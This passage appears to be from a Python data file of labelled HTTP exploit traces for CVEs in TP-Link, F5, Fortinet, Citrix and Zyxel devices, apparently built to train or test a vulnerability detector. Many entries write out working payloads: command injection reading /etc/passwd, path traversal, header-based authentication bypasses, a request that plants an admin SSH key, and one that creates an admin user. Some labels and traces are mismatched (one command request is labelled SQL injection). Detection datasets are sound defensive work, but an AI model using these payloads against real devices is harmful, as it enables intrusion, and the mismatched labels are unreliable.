            "sink_param": "country",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/51677",
            "reasoning": "locale endpoint country parameter passed to popen() without sanitization. $(cmd) substitution. Mirai actively exploits. Archer AX21 v1.1.4."
        }
    },
    {
        "cve_id": "CVE-2023-33538",
        "vendor": "TP-Link",
        "product": "Multiple Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/luci/;stok=/admin/wireless",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "form=guest_access&operation=write&guest_access_ssid=$(cat /etc/passwd)"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"success\":true}"
            }
        },
        "ground_truth": {
            "sink_param": "guest_access_ssid",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-33538",
            "reasoning": "Wireless settings endpoint passes guest SSID to shell. Affects TL-WR940N, TL-WR841N, Archer AX21."
        }
    },
    {
        "cve_id": "CVE-2023-50224",
        "vendor": "TP-Link",
        "product": "TL-WR841N",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/userRpm/LoginRpm.htm",
                "params": {},
                "headers": {"Referer": "http://192.168.0.1/"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "var authKey = \"admin:admin\";"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-50224",
            "reasoning": "Login page leaks credentials. Weak authentication mechanism allows bypass. TL-WR841N."
        }
    },
    {
        "cve_id": "CVE-2025-9377",
        "vendor": "TP-Link",
        "product": "Multiple Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/luci/;stok=/locale",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "form=country&operation=write&country=$(cat /etc/passwd)"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"success\":true}"
            }
        },
        "ground_truth": {
            "sink_param": "country",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-9377",
            "reasoning": "Similar locale injection as CVE-2023-1389. Affects additional TP-Link router models."
        }
    },
    # ===== F5 (7) =====
    {
        "cve_id": "CVE-2020-5902",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
                "params": {"fileName": "/etc/passwd"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "{\"output\":\"root:x:0:0:root:\\/root:\\/bin\\/bash\\n\"}"
            }
        },
        "ground_truth": {
            "sink_param": "fileName",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/48642",
            "reasoning": "TMUI path traversal via ..;/ (Tomcat path normalization bypass) + fileRead.jsp for arbitrary file read. Also allows RCE via tmshCmd.jsp. CVSS 10.0."
        }
    },
    {
        "cve_id": "CVE-2021-22986",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "Authorization": "Basic YWRtaW46",
                    "X-F5-Auth-Token": "",
                    "Connection": "X-F5-Auth-Token, X-Forwarded-Host"
                },
                "body": "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"commandResult\":\"root:x:0:0:root:/root:/bin/bash\\n\"}"
            }
        },
        "ground_truth": {
            "sink_param": "utilCmdArgs",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/49738",
            "reasoning": "iControl REST auth bypass via Connection header + bash utility execution. SSRF allows unauthenticated RCE. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2021-22991",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/" + "A" * 4096,
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-22991",
            "reasoning": "TMM buffer overflow via overly long URI in undisclosed requests. Leads to DoS or potential RCE. BIG-IP Traffic Management Microkernel."
        }
    },
    {
        "cve_id": "CVE-2022-1388",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "Authorization": "Basic YWRtaW46",
                    "X-F5-Auth-Token": "anything",
                    "Connection": "keep-alive, X-F5-Auth-Token"
                },
                "body": "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"commandResult\":\"root:x:0:0:root:/root:/bin/bash\\n\"}"
            }
        },
        "ground_truth": {
            "sink_param": "utilCmdArgs",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/50932",
            "reasoning": "iControl REST auth bypass via hop-by-hop Connection header dropping X-F5-Auth-Token. Unauthenticated RCE. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2023-46747",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/mgmt/tm/auth/user",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Forwarded-Host": "localhost"
                },
                "body": "{\"name\":\"attacker\",\"partition\":\"Common\",\"shell\":\"bash\",\"role\":\"admin\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"name\":\"attacker\",\"shell\":\"bash\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/51898",
            "reasoning": "Request smuggling via AJP allows bypass of authentication to Configuration Utility. Can create admin users. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2023-46748",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "command=create+cli+alias+private+list+command+bash"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "command",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-46748",
            "reasoning": "SQL injection in Configuration Utility, authenticated. Used in chained attacks with CVE-2023-46747 auth bypass."
        }
    },
    {
        "cve_id": "CVE-2025-53521",
        "vendor": "F5",
        "product": "BIG-IP",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "body": "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"commandResult\":\"root:x:0:0:root:/root:/bin/bash\\n\"}"
            }
        },
        "ground_truth": {
            "sink_param": "utilCmdArgs",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-53521",
            "reasoning": "iControl REST command injection via authenticated bash utility endpoint. Similar exploitation path to CVE-2022-1388."
        }
    },
    # ===== Fortinet (21) =====
    {
        "cve_id": "CVE-2018-13379",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/remote/fgt_lang",
                "params": {"lang": "/../../../..//////////dev/cmdb/sslvpn_websession"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "username=admin&password=fortinet123"
            }
        },
        "ground_truth": {
            "sink_param": "lang",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/47287",
            "reasoning": "SSL VPN path traversal via lang parameter reads sslvpn_websession file containing plaintext credentials. CVSS 9.8. Massively exploited in the wild."
        }
    },
    {
        "cve_id": "CVE-2018-13374",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/cmdb/system/admin",
                "params": {},
                "headers": {"User-Agent": "Report Runner"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":[{\"name\":\"admin\",\"accprofile\":\"super_admin\"}]}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-13374",
            "reasoning": "LDAP credential disclosure via improper access control. Authenticated user can read LDAP credentials via REST API. FortiOS and FortiADC."
        }
    },
    {
        "cve_id": "CVE-2018-13382",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/remote/logincheck",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "ajax=1&username=admin&magic=4tinet2095866&credential=Y3dh&realm="
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "redir=/remote/index"
            }
        },
        "ground_truth": {
            "sink_param": "magic",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/47288",
            "reasoning": "Magic value 4tinet2095866 allows password change for any SSL VPN user without knowing current password. FortiOS SSL VPN."
        }
    },
    {
        "cve_id": "CVE-2018-13383",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/remote/hostcheck_validate",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "imgnum=" + "A" * 65536
            },
            "response": {
                "status_code": 500,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "imgnum",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-13383",
            "reasoning": "Heap buffer overflow in SSL VPN web portal via oversized imgnum parameter. Can lead to RCE or crash. FortiOS and FortiProxy."
        }
    },
    {
        "cve_id": "CVE-2019-5591",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/cmdb/system/interface",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":[{\"name\":\"port1\",\"ip\":\"192.168.1.1\"}]}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-5591",
            "reasoning": "Default configuration does not verify LDAP server identity. MitM attacker on same subnet can intercept LDAP credentials. FortiOS 6.2.0 and below."
        }
    },
    {
        "cve_id": "CVE-2019-6693",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/cmdb/vpn.ssl/settings",
                "params": {},
                "headers": {"Authorization": "Bearer <session_token>"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":{\"source-address\":[],\"enc-algorithm\":\"AES128-SHA\"}}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-6693",
            "reasoning": "Sensitive credentials stored using reversible encryption in FortiOS config. Authenticated admin can recover LDAP/RADIUS passwords."
        }
    },
    {
        "cve_id": "CVE-2020-12812",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/remote/logincheck",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "ajax=1&username=Admin&credential=password&realm="
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "redir=/remote/index"
            }
        },
        "ground_truth": {
            "sink_param": "username",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-12812",
            "reasoning": "Case change in username bypasses two-factor authentication. If user is 'admin', logging in as 'Admin' skips 2FA. FortiOS SSL VPN."
        }
    },
    {
        "cve_id": "CVE-2021-44168",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/cmdb/system/automation-action",
                "params": {},
                "headers": {"Authorization": "Bearer <admin_token>"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":[]}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-44168",
            "reasoning": "Download of code without integrity check via automation-action allows arbitrary file download to FortiOS filesystem. Requires admin auth."
        }
    },
    {
        "cve_id": "CVE-2022-40684",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "PUT",
                "path": "/api/v2/cmdb/system/admin/admin",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "Forwarded": "for=\"127.0.0.1:443\";by=\"127.0.0.1:443\""
                },
                "body": "{\"ssh-public-key1\":\"ssh-rsa AAAAB3... attacker@key\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": "Forwarded",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/51092",
            "reasoning": "Forwarded header spoofs trusted source IP, bypassing admin auth. Attacker can add SSH key to admin account. FortiOS, FortiProxy, FortiSwitchManager. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2022-41328",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/monitor/system/firmware",
                "params": {},
                "headers": {"Authorization": "Bearer <admin_token>"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":{}}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-41328",
            "reasoning": "Path traversal allows privileged attacker to read/write arbitrary files via CLI commands. Used by threat actors to modify firmware. FortiOS."
        }
    },
    {
        "cve_id": "CVE-2022-42475",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/remote/login",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "<html><title>SSL-VPN Login</title></html>"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-42475",
            "reasoning": "Heap-based buffer overflow in SSL-VPN sslvpnd daemon. Pre-auth RCE via crafted request. Used by APT actors. FortiOS 7.2.x before 7.2.3."
        }
    },
    {
        "cve_id": "CVE-2023-27997",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/remote/hostcheck_validate",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-27997",
            "reasoning": "Heap buffer overflow in SSL-VPN pre-auth. XORtigate - crafted requests to hostcheck_validate trigger heap corruption. FortiOS and FortiProxy."
        }
    },
    {
        "cve_id": "CVE-2024-21762",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/remote/hostcheck_validate",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-21762",
            "reasoning": "Out-of-bounds write in SSL VPN daemon. Pre-auth RCE via specially crafted HTTP requests. FortiOS 7.4.x before 7.4.2. CVSS 9.6."
        }
    },
    {
        "cve_id": "CVE-2024-55591",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/v2/cmdb/system/admin/admin",
                "params": {},
                "headers": {
                    "Content-Type": "application/json",
                    "Authorization": "Bearer <crafted_jwt>"
                },
                "body": "{\"accprofile\":\"super_admin\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-55591",
            "reasoning": "Node.js websocket auth bypass via crafted requests to jsconsole. Attacker gains super_admin privileges. FortiOS 7.0.x and FortiProxy 7.0/7.2."
        }
    },
    {
        "cve_id": "CVE-2025-24472",
        "vendor": "Fortinet",
        "product": "FortiOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/cmdb/system/admin",
                "params": {},
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":[{\"name\":\"admin\"}]}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-24472",
            "reasoning": "CSF proxy auth bypass via crafted requests. Alternative attack vector to CVE-2024-55591. FortiOS and FortiProxy."
        }
    },
    {
        "cve_id": "CVE-2025-25257",
        "vendor": "Fortinet",
        "product": "FortiWeb",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/v2.0/user/login",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"username\":\"admin\",\"password\":\"admin\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"token\":\"abc123\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-25257",
            "reasoning": "Stack-based buffer overflow in FortiWeb API. Authenticated attacker can execute arbitrary code. FortiWeb web application firewall."
        }
    },
    {
        "cve_id": "CVE-2025-32756",
        "vendor": "Fortinet",
        "product": "Multiple Products",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/v2/cmdb/system/admin",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"username\":\"admin\",\"password\":\"admin\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-32756",
            "reasoning": "Stack-based buffer overflow in FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera. Pre-auth RCE via crafted HTTP requests."
        }
    },
    {
        "cve_id": "CVE-2025-58034",
        "vendor": "Fortinet",
        "product": "FortiWeb",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/v2.0/cmdb/server-policy/policy",
                "params": {},
                "headers": {"Content-Type": "application/json", "Authorization": "Bearer <token>"},
                "body": "{\"name\":\"test\",\"comment\":\";cat /etc/passwd\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": "comment",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-58034",
            "reasoning": "OS command injection in FortiWeb management interface. Authenticated admin can inject commands via API parameters."
        }
    },
    {
        "cve_id": "CVE-2025-59718",
        "vendor": "Fortinet",
        "product": "Multiple Products",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/v2/cmdb/system/interface",
                "params": {},
                "headers": {"Content-Type": "application/json", "Authorization": "Bearer <token>"},
                "body": "{\"name\":\"port1\",\"alias\":\"test\"}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-59718",
            "reasoning": "Improper neutralization of special elements in FortiOS/FortiProxy web management interface. Authenticated attacker can execute unauthorized code."
        }
    },
    {
        "cve_id": "CVE-2025-64446",
        "vendor": "Fortinet",
        "product": "FortiWeb",
        "vuln_class": "PT",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2.0/cmdb/../../../../etc/passwd",
                "params": {},
                "headers": {"Authorization": "Bearer <token>"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-64446",
            "reasoning": "Path traversal in FortiWeb management interface allows authenticated admin to read arbitrary files."
        }
    },
    {
        "cve_id": "CVE-2026-24858",
        "vendor": "Fortinet",
        "product": "Multiple Products",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/api/v2/cmdb/system/admin",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"results\":[{\"name\":\"admin\"}]}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-24858",
            "reasoning": "Authentication bypass in FortiOS/FortiProxy management interface via crafted requests."
        }
    },
    {
        "cve_id": "CVE-2017-6316",
        "vendor": "Citrix",
        "product": "NetScaler SD-WAN",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/coldfusion/cfide/adminapi/customtags/l10n.cfm",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "attributes.id=en&attributes.file=../../../../../../etc/passwd&attributes.locale=en&attributes.var=it&attributes.jscript=false&attributes.type=text&attributes.charset=utf-8&thisTag.executionmode=start&thisTag.generatedcontent=htp"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "attributes.file",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2017-6316",
            "reasoning": "Shell command injection in Citrix NetScaler SD-WAN/CloudBridge. Unauthenticated RCE."
        }
    },
    # ===== Citrix (remaining) =====
    {
        "cve_id": "CVE-2019-19781",
        "vendor": "Citrix",
        "product": "ADC/Gateway",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/vpns/portal/scripts/newbm.pl",
                "params": {},
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "NSC_USER": "../../../../netscaler/portal/templates/test",
                    "NSC_NONCE": "test"
                },
                "body": "url=http://example.com&title=test&desc=[%template.new({'BLOCK'='print`cat /etc/passwd`'})%]"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "NSC_USER",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://www.exploit-db.com/exploits/47901",
            "reasoning": "Path traversal in NSC_USER header + Perl template injection for RCE. Citrix ADC (NetScaler) Shitrix vulnerability. CVSS 9.8."
        }
    },
    {
        "cve_id": "CVE-2023-3519",
        "vendor": "Citrix",
        "product": "NetScaler ADC/Gateway",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/gwtest/formssso",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "CWCSSP_TARGET=" + "A" * 24576
            },
            "response": {
                "status_code": 200,
                "headers": {},
                "body": ""
            }
        },
        "ground_truth": {
            "sink_param": "CWCSSP_TARGET",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-3519",
            "reasoning": "Stack buffer overflow in formssso SAML parser. Pre-auth RCE via oversized CWCSSP_TARGET. NetScaler ADC/Gateway configured as Gateway or AAA virtual server."
        }
    },
    {
        "cve_id": "CVE-2023-4966",
        "vendor": "Citrix",
        "product": "NetScaler ADC/Gateway",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/oauth/idp/.well-known/openid-configuration",
                "params": {},
                "headers": {
                    "Host": "a]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]"
                },
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "SESSION_TOKEN_LEAKED_HERE"
            }
        },
        "ground_truth": {
            "sink_param": "Host",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-4966",
            "reasoning": "Citrix Bleed - oversized Host header in OAuth endpoint causes buffer over-read leaking session tokens. Pre-auth. NetScaler ADC/Gateway. CVSS 9.4."
        }
    },
    {
        "cve_id": "CVE-2023-6548",
        "vendor": "Citrix",
        "product": "NetScaler ADC/Gateway",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/nitro/v1/config/login",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{\"login\":{\"username\":\"nsroot\",\"password\":\"nsroot\"}}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"sessionid\":\"abc123\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-6548",
            "reasoning": "Authenticated RCE in NetScaler management interface. Requires low-privilege access to NSIP/CLIP/SNIP with management interface access."
        }
    },
    # ===== Zyxel (10) =====
    {
        "cve_id": "CVE-2017-18368",
        "vendor": "Zyxel",
        "product": "P660HN-T1A",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/ViewLog.asp",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&Logession=1&remote_host=;cat /etc/passwd;&remession=1"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "remote_host",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://www.exploit-db.com/exploits/44292",
            "reasoning": "ViewLog.asp remote_host parameter passed to shell. No auth required. Actively exploited by Mirai botnet."
        }
    },
    {
        "cve_id": "CVE-2017-6884",
